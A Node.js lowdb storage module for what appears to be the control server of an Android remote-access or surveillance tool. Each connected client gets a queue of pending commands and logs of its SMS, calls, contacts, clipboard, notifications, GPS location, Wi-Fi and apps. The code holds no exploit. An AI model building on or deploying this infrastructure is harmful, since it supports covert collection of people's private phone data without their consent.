const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    path = require('path'),
    crypto = require('crypto'),
    fs = require('fs');

// Atomic write wrapper: writes to a temp file then renames.
// This prevents corruption if the process crashes mid-write.
class AtomicFileSync extends FileSync {
    write(data) {
        if (data === undefined) return;
        const tmpPath = this.source + '.tmp.' + process.pid;
        fs.writeFileSync(tmpPath, this.serialize(data));
        fs.renameSync(tmpPath, this.source);
    }
}

const adapter = new AtomicFileSync('./maindb.json');
const db = lowdb(adapter);

db.defaults({
    admin: {
        username: 'admin',
        password: '',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

class clientdb {
    constructor(clientID) {
        // Sanitize clientID to prevent path traversal
        let safeClientID = (clientID || 'unknown').toString().replace(/[^a-zA-Z0-9_-]/g, '');
        // Patch: Limit clientID length to prevent filesystem errors
        if (safeClientID.length > 200) {
            safeClientID = safeClientID.substring(0, 200);
        }
        if (safeClientID === '') {
            safeClientID = 'unnamed_' + crypto.createHash('md5').update(String(clientID)).digest('hex').slice(0, 8);
        }
        let cdb = lowdb(new AtomicFileSync('./clientData/' + safeClientID + '.json'))
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: []
        }).write()
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};
